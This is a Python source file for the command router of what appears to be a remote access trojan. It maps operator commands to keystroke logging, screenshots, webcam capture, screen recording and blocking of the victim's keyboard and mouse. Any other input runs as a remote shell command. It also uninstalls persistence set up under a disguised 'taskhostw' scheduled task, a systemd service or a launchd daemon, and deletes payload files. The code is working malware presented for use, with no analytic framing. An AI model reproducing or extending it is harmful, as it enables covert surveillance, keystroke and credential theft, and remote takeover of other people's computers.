"""
Command router for handling all incoming commands
"""

import socket
import sys
from typing import Dict, Callable
from utils.modes import Mode, ModeManager
from utils.protocol import send_text
from utils.common import log


class CommandRouter:
    """Routes commands to appropriate handlers"""

    def __init__(self, mode_manager: ModeManager):
        self.mode_manager = mode_manager
        self.handlers: Dict[str, Callable] = {}
        self.current_dir = None  # For shell command tracking
        self._register_handlers()

    def _register_handlers(self):
        """Register all command handlers"""
        from utils.features.keylogger import start_keylogger, stop_keylogger, dump_keylog
        from utils.features.screenshot import take_screenshot
        from utils.features.snapshot import take_webcam_snapshot
        from utils.features.screenrecord import start_recording, stop_recording
        from utils.features.mouse import start_jitter, stop_jitter
        from utils.features.blackhole import start_blackhole, stop_blackhole

        self.handlers = {
            "/help": self._show_help,
            "/keylogger": start_keylogger,
            "/keylogger/dump": dump_keylog,
            "/screenshot": take_screenshot,
            "/snapshot": take_webcam_snapshot,
            "/screenrecord": start_recording,
            "/mouse/jitter": start_jitter,
            "/blackhole": start_blackhole,
            "/stop": self._stop_active_task,
            "/quit": self._quit_receiver,
        }

    def handle_command(self, command: str, sock: socket.socket):
        """
        Route command to appropriate handler.

        Args:
            command: Command string from sender
            sock: Socket for communication
        """
        command = command.strip()

        # Check if it's a special command
        if command in self.handlers:
            log(f"$ {command}")
            self.handlers[command](sock, self.mode_manager)

        # If in NORMAL mode, execute as shell command
        elif self.mode_manager.current_mode == Mode.NORMAL:
            log(f"$ {command}")
            from utils.features.shell import execute_command_stream

            self.current_dir = execute_command_stream(
                command, sock, self.current_dir, self.mode_manager.socket_write_lock
            )

        # If in another mode, warn
        else:
            msg = (
                f"[WARNING: In {self.mode_manager.current_mode.value} mode. Use /stop to exit or /quit to uninstall.]\n"
            )
            send_text(sock, msg, self.mode_manager.socket_write_lock)

    def _show_help(self, sock: socket.socket, mode_manager: ModeManager):
        """Display available commands"""
        help_text = """
Available commands:

  INFORMATION:
    /help              - Show this help message

  MONITORING:
    /keylogger         - Start keystroke logging (streams to sender)
    /keylogger/dump    - Info about keylog streaming
    /screenshot        - Capture screen and save to sender
    /snapshot          - Capture webcam photo
    /screenrecord      - Start screen recording (5 FPS, frame streaming)

  CONTROL:
    /mouse/jitter      - Start random mouse movements (±100px)
    /blackhole         - Block all keyboard/mouse input

  SYSTEM:
    /stop              - Stop current active mode
    /quit              - Uninstall service and exit
    <any other text>   - Execute as shell command (in NORMAL mode)

Current mode: {mode}
"""
        send_text(sock, help_text.format(mode=mode_manager.current_mode.value), mode_manager.socket_write_lock)

    def _stop_active_task(self, sock: socket.socket, mode_manager: ModeManager):
        """Stop the currently active background task"""
        if mode_manager.current_mode == Mode.NORMAL:
            send_text(sock, "[No active task to stop.]\n", mode_manager.socket_write_lock)
            return

        # Route to appropriate stop function
        if mode_manager.current_mode == Mode.KEYLOGGER:
            from utils.features.keylogger import stop_keylogger

            stop_keylogger(sock, mode_manager)

        elif mode_manager.current_mode == Mode.SCREENRECORD:
            from utils.features.screenrecord import stop_recording

            stop_recording(sock, mode_manager)

        elif mode_manager.current_mode == Mode.MOUSE_JITTER:
            from utils.features.mouse import stop_jitter

            stop_jitter(sock, mode_manager)

        elif mode_manager.current_mode == Mode.BLACKHOLE:
            from utils.features.blackhole import stop_blackhole

            stop_blackhole(sock, mode_manager)

        else:
            # Fallback - generic stop
            mode_manager.signal_stop()
            mode_manager.wait_for_thread()
            mode_manager.reset_mode()
            send_text(sock, f"[Stopped {mode_manager.current_mode.value}]\n", mode_manager.socket_write_lock)

    def _quit_receiver(self, sock: socket.socket, mode_manager: ModeManager):
        """Quit and uninstall the receiver"""
        import platform
        import subprocess
        from utils.common import cleanup_payload_files

        log("Received /quit command - uninstalling service and shutting down...")

        # Send acknowledgment
        msg = "\n[Uninstalling service and shutting down...]\n"
        send_text(sock, msg, mode_manager.socket_write_lock)

        # Uninstall the service
        system = platform.system()

        if system == "Windows":
            log("Uninstalling Windows Task...")
            subprocess.run(["schtasks", "/delete", "/tn", "taskhostw", "/f"], capture_output=True)
            log("Windows Task uninstalled.")

            # Clean up payload files and .dev_mode marker
            cleanup_payload_files()

        elif system == "Linux":
            log("Uninstalling systemd service...")
            commands = [
                ["sudo", "systemctl", "stop", "tcp-receiver.service"],
                ["sudo", "systemctl", "disable", "tcp-receiver.service"],
                ["sudo", "rm", "-f", "/etc/systemd/system/tcp-receiver.service"],
                ["sudo", "systemctl", "daemon-reload"],
            ]
            for cmd in commands:
                subprocess.run(cmd, capture_output=True)
            log("Systemd service uninstalled.")

        elif system == "Darwin":
            log("Uninstalling launchd service...")
            plist_file = "/Library/LaunchDaemons/com.tcp.receiver.plist"
            commands = [
                ["sudo", "launchctl", "unload", plist_file],
                ["sudo", "rm", "-f", plist_file],
            ]
            for cmd in commands:
                subprocess.run(cmd, capture_output=True)
            log("Launchd service uninstalled.")

        # Exit completely
        log("Service uninstalled. Exiting.")
        sys.exit(0)
